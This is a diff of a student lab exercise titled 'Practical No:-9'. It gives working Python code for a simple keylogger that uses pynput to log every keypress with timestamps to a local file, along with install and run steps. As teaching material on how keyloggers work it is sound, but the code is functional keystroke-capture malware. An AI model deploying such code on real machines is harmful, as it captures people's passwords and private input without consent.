@@ -2,14 +2,16 @@ Practical No:-9
 Aim:- Create a simple keylogger using python. Keylogger:-
 Steps: 1)Open python and write following code
 Program Code:
-from pynput.keyboard import Key,Listener 
+from pynput.keyboard import Key, Listener
 import logging
-log_dir="D://" logging.basicConfig(filename=(log_dir+"key_log"),level=logging.DEBUG, format='%(asctime)s:%(message)s:')
-
+ 
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+ 
 def on_press(key):
-logging.info(str(key))
-with Listener(on_press=on_press)as listener:
-listener.join()
+    logging.info(str(key))
+ 
+with Listener(on_press=on_press) as listener :
+    listener.join()
 
 2) Open cmd and write command: pip install pynput 
 3) Run the program and type Email.
